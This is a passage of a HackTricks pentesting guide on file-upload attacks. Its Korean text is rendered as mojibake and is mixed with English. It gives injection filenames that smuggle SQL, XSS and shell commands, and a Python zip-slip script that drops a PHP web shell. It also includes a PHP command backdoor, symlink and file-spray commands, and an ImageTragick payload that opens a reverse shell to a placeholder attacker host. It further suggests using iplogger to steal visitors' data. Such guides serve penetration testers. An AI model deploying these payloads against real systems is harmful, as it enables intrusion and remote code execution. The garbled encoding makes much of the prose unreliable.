Note that **ë‹¤ë¥¸ ì˜µì…˜** you may be thinking of to bypass this check is to make the **HTTP ì„œë²„ê°€ ë‹¤ë¥¸ íŒŒì¼ë¡œ ë¦¬ë””ë ‰ì…˜** í•˜ë„ë¡ í•˜ì—¬, ì´ˆê¸° URLì´ ì²´í¬ë¥¼ ìš°íšŒí•˜ê²Œ í•˜ê³  wgetì´ ìƒˆë¡œìš´ ì´ë¦„ìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ëœ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. This **ì‘ë™í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤** **unless** wget is being used with the **parameter** `--trust-server-names` because **wgetì€ ì›ë˜ URLì— í‘œì‹œëœ íŒŒì¼ ì´ë¦„ìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ëœ í˜ì´ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•  ê²ƒì…ë‹ˆë‹¤**.

## Tools

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) ëŠ” Pentestersì™€ Bug Huntersê°€ íŒŒì¼ ì—…ë¡œë“œ ë©”ì»¤ë‹ˆì¦˜ì„ í…ŒìŠ¤íŠ¸í•˜ëŠ” ë° ë„ì›€ì„ ì£¼ê¸° ìœ„í•´ ì„¤ê³„ëœ ê°•ë ¥í•œ ë„êµ¬ì…ë‹ˆë‹¤. ë‹¤ì–‘í•œ ë²„ê·¸ ë°”ìš´í‹° ê¸°ë²•ì„ í™œìš©í•˜ì—¬ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ì•…ìš©í•˜ëŠ” ê³¼ì •ì„ ë‹¨ìˆœí™”í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì² ì €í•œ í‰ê°€ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤.

## From File upload to other vulnerabilities

* **filename**ì„ `../../../tmp/lol.png`ë¡œ ì„¤ì •í•˜ê³  **ê²½ë¡œ íƒìƒ‰**ì„ ì‹œë„í•©ë‹ˆë‹¤.
* **filename**ì„ `sleep(10)-- -.jpg`ë¡œ ì„¤ì •í•˜ë©´ **SQL ì¸ì ì…˜**ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **filename**ì„ `<svg onload=alert(document.domain)>`ë¡œ ì„¤ì •í•˜ì—¬ XSSë¥¼ ë‹¬ì„±í•©ë‹ˆë‹¤.
* **filename**ì„ `; sleep 10;`ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ì¼ë¶€ ëª…ë ¹ ì£¼ì…ì„ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤ (ë” ë§ì€ [ëª…ë ¹ ì£¼ì… íŠ¸ë¦­ì€ ì—¬ê¸°](../command-injection.md)ì—ì„œ í™•ì¸í•˜ì„¸ìš”).
* [**XSS** in image (svg) file upload](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** íŒŒì¼ **ì—…ë¡œë“œ** + **XSS** = [**Service Workers** ì•…ìš©](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
* Try **ë‹¤ì–‘í•œ svg í˜ì´ë¡œë“œ** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [ìœ ëª…í•œ **ImageTrick** ì·¨ì•½ì ](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* If you can **ì›¹ ì„œë²„ì— URLì—ì„œ ì´ë¯¸ì§€ë¥¼ ê°€ì ¸ì˜¤ë„ë¡ ì§€ì‹œí•  ìˆ˜ ìˆë‹¤ë©´**, [SSRF](../ssrf-server-side-request-forgery/)ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. If this **ì´ë¯¸ì§€**ê°€ **ê³µê°œ** ì‚¬ì´íŠ¸ì— **ì €ì¥**ë  ê²½ìš°, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)ì˜ URLì„ ì§€ì •í•˜ì—¬ **ëª¨ë“  ë°©ë¬¸ìì˜ ì •ë³´ë¥¼ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* [**XXE and CORS** ìš°íšŒ with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
* íŠ¹ë³„íˆ ì œì‘ëœ PDFë¡œ XSS: [ë‹¤ìŒ í˜ì´ì§€ëŠ” **PDF ë°ì´í„°ë¥¼ ì£¼ì…í•˜ì—¬ JS ì‹¤í–‰ì„ ì–»ëŠ” ë°©ë²•**ì„ ì œì‹œí•©ë‹ˆë‹¤](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
* Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤**
* Check if there is any **í¬ê¸° ì œí•œ** uploading files

Hereâ€™s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magic Header Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) for other filetypes.

### Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

#### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### ë‹¤ë¥¸ í´ë”ì— ì••ì¶• í•´ì œ

ì••ì¶• í•´ì œ ì¤‘ ë””ë ‰í† ë¦¬ì— íŒŒì¼ì´ ì˜ˆê¸°ì¹˜ ì•Šê²Œ ìƒì„±ë˜ëŠ” ê²ƒì€ ì¤‘ìš”í•œ ë¬¸ì œì…ë‹ˆë‹¤. ì´ ì„¤ì •ì´ ì•…ì˜ì ì¸ íŒŒì¼ ì—…ë¡œë“œë¥¼ í†µí•œ OS ìˆ˜ì¤€ì˜ ëª…ë ¹ ì‹¤í–‰ì„ ë°©ì§€í•  ê²ƒì´ë¼ëŠ” ì´ˆê¸° ê°€ì •ì—ë„ ë¶ˆêµ¬í•˜ê³ , ZIP ì•„ì¹´ì´ë¸Œ í˜•ì‹ì˜ ê³„ì¸µì  ì••ì¶• ì§€ì› ë° ë””ë ‰í† ë¦¬ íƒìƒ‰ ê¸°ëŠ¥ì´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì œí•œì„ ìš°íšŒí•˜ê³  ëŒ€ìƒ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì••ì¶• í•´ì œ ê¸°ëŠ¥ì„ ì¡°ì‘í•˜ì—¬ ì•ˆì „í•œ ì—…ë¡œë“œ ë””ë ‰í† ë¦¬ë¥¼ íƒˆì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ íŒŒì¼ì„ ìƒì„±í•˜ê¸° ìœ„í•œ ìë™í™”ëœ ìµìŠ¤í”Œë¡œì‡ì€ [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ í‹¸ë¦¬í‹°ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
ì¶”ê°€ì ìœ¼ë¡œ, **evilarcì™€ í•¨ê»˜í•˜ëŠ” symlink íŠ¸ë¦­**ì€ ì˜µì…˜ì…ë‹ˆë‹¤. ëª©í‘œê°€ `/flag.txt`ì™€ ê°™ì€ íŒŒì¼ì„ íƒ€ê²Ÿìœ¼ë¡œ í•˜ëŠ” ê²½ìš°, í•´ë‹¹ íŒŒì¼ì— ëŒ€í•œ symlinkë¥¼ ì‹œìŠ¤í…œì— ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ evilarcê°€ ì‘ë™ ì¤‘ ì˜¤ë¥˜ë¥¼ ê²ªì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤.

ì•„ë˜ëŠ” ì•…ì„± zip íŒŒì¼ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” Python ì½”ë“œì˜ ì˜ˆì…ë‹ˆë‹¤:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**ì••ì¶•ì„ ì•…ìš©í•œ íŒŒì¼ ìŠ¤í”„ë ˆì´**

ìì„¸í•œ ë‚´ìš©ì€ **ì›ë³¸ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP ì…¸ ìƒì„±**: PHP ì½”ë“œëŠ” `$_REQUEST` ë³€ìˆ˜ë¥¼ í†µí•´ ì „ë‹¬ëœ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ ì‘ì„±ë©ë‹ˆë‹¤.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **íŒŒì¼ ìŠ¤í”„ë ˆì´ ë° ì••ì¶• íŒŒì¼ ìƒì„±**: ì—¬ëŸ¬ íŒŒì¼ì´ ìƒì„±ë˜ê³  ì´ëŸ¬í•œ íŒŒì¼ì„ í¬í•¨í•˜ëŠ” zip ì•„ì¹´ì´ë¸Œê°€ ì¡°ë¦½ë©ë‹ˆë‹¤.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **Hex í¸ì§‘ê¸° ë˜ëŠ” vië¡œ ìˆ˜ì •**: zip ë‚´ë¶€ì˜ íŒŒì¼ ì´ë¦„ì„ vi ë˜ëŠ” hex í¸ì§‘ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³€ê²½í•˜ì—¬ "xxA"ë¥¼ "../"ë¡œ ë³€ê²½í•˜ì—¬ ë””ë ‰í† ë¦¬ë¥¼ íƒìƒ‰í•©ë‹ˆë‹¤.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

ì´ ì½˜í…ì¸ ë¥¼ ì´ë¯¸ì§€ í™•ì¥ìë¡œ ì—…ë¡œë“œí•˜ì—¬ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì„¸ìš” **(ImageMagick , 7.0.1-1)** (ì¶œì²˜: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGì— PHP ì…¸ ì‚½ì…í•˜ê¸°

PNG íŒŒì¼ì˜ IDAT ì²­í¬ì— PHP ì…¸ì„ ì‚½ì…í•˜ë©´ íŠ¹ì • ì´ë¯¸ì§€ ì²˜ë¦¬ ì‘ì—…ì„ íš¨ê³¼ì ìœ¼ë¡œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. PHP-GDì˜ `imagecopyresized` ë° `imagecopyresampled` í•¨ìˆ˜ëŠ” ê°ê° ì´ë¯¸ì§€ë¥¼ í¬ê¸° ì¡°ì •í•˜ê³  ì¬ìƒ˜í”Œë§í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë¯€ë¡œ ì´ ë§¥ë½ì—ì„œ íŠ¹íˆ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ì‚½ì…ëœ PHP ì…¸ì´ ì´ëŸ¬í•œ ì‘ì—…ì˜ ì˜í–¥ì„ ë°›ì§€ ì•ŠëŠ” ëŠ¥ë ¥ì€ íŠ¹ì • ì‚¬ìš© ì‚¬ë¡€ì— ìˆì–´ ì¤‘ìš”í•œ ì¥ì ì…ë‹ˆë‹¤.

ì´ ê¸°ìˆ ì— ëŒ€í•œ ìì„¸í•œ íƒêµ¬, ë°©ë²•ë¡  ë° ì ì¬ì  ì‘ìš© í”„ë¡œê·¸ë¨ì€ ë‹¤ìŒ ê¸°ì‚¬ì—ì„œ ì œê³µë©ë‹ˆë‹¤: ["PNG IDAT ì²­í¬ì— ì›¹ ì…¸ ì¸ì½”ë”©í•˜ê¸°"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). ì´ ìë£ŒëŠ” í”„ë¡œì„¸ìŠ¤ì™€ ê·¸ ì˜ë¯¸ì— ëŒ€í•œ í¬ê´„ì ì¸ ì´í•´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ”: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼

ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì€ ì‚¬ì´ë²„ ë³´ì•ˆì—ì„œ ë…íŠ¹í•œ ë„êµ¬ë¡œ ì‘ìš©í•˜ë©°, ì—¬ëŸ¬ íŒŒì¼ í˜•ì‹ì—ì„œ ë™ì‹œì— ìœ íš¨í•˜ê²Œ ì¡´ì¬í•  ìˆ˜ ìˆëŠ” ì¹´ë©œë ˆì˜¨ê³¼ ê°™ìŠµë‹ˆë‹¤. í¥ë¯¸ë¡œìš´ ì˜ˆë¡œëŠ” [GIFAR](https://en.wikipedia.org/wiki/Gifar)ê°€ ìˆìœ¼ë©°, ì´ëŠ” GIFì™€ RAR ì•„ì¹´ì´ë¸Œë¡œì„œ ê¸°ëŠ¥í•˜ëŠ” í•˜ì´ë¸Œë¦¬ë“œì…ë‹ˆë‹¤. ì´ëŸ¬í•œ íŒŒì¼ì€ ì´ ì¡°í•©ì— êµ­í•œë˜ì§€ ì•Šìœ¼ë©°, GIFì™€ JS ë˜ëŠ” PPTì™€ JSì™€ ê°™ì€ ì¡°í•©ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì˜ í•µì‹¬ ìœ í‹¸ë¦¬í‹°ëŠ” íŒŒì¼ ìœ í˜•ì— ë”°ë¼ íŒŒì¼ì„ ìŠ¤í¬ë¦¬ë‹í•˜ëŠ” ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì— ìˆìŠµë‹ˆë‹¤. ë‹¤ì–‘í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì¼ë°˜ì ì¸ ê´€í–‰ì€ JPEG, GIF ë˜ëŠ” DOCì™€ ê°™ì€ íŠ¹ì • íŒŒì¼ ìœ í˜•ë§Œ ì—…ë¡œë“œë¥¼ í—ˆìš©í•˜ì—¬ ì ì¬ì ìœ¼ë¡œ í•´ë¡œìš´ í˜•ì‹(ì˜ˆ: JS, PHP ë˜ëŠ” Phar íŒŒì¼)ìœ¼ë¡œ ì¸í•œ ìœ„í—˜ì„ ì™„í™”í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì€ ì—¬ëŸ¬ íŒŒì¼ ìœ í˜•ì˜ êµ¬ì¡°ì  ê¸°ì¤€ì„ ì¤€ìˆ˜í•¨ìœ¼ë¡œì¨ ì´ëŸ¬í•œ ì œí•œì„ ì€ë°€í•˜ê²Œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì ì‘ì„±ì—ë„ ë¶ˆêµ¬í•˜ê³ , ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì€ í•œê³„ì— ì§ë©´í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì´ PHAR íŒŒì¼(PHp ARchive)ê³¼ JPEGë¥¼ ë™ì‹œì— í¬í•¨í•  ìˆ˜ ìˆì§€ë§Œ, ì—…ë¡œë“œì˜ ì„±ê³µ ì—¬ë¶€ëŠ” í”Œë«í¼ì˜ íŒŒì¼ í™•ì¥ì ì •ì±…ì— ë‹¬ë ¤ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹œìŠ¤í…œì´ í—ˆìš©ë˜ëŠ” í™•ì¥ìì— ëŒ€í•´ ì—„ê²©í•˜ë‹¤ë©´, ë‹¤ì¤‘ ì–¸ì–´ íŒŒì¼ì˜ ë‹¨ìˆœí•œ êµ¬ì¡°ì  ì´ì¤‘ì„±ë§Œìœ¼ë¡œëŠ” ì—…ë¡œë“œë¥¼ ë³´ì¥í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ”: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## ì°¸ê³  ë¬¸í—Œ

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ë‹¹ì‹ ì´ **í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ì±„ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ê¸° ë° êµ¬ì‚¬ í•„ìš”_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì„¸ìš”.**

</details>
{% endhint %}
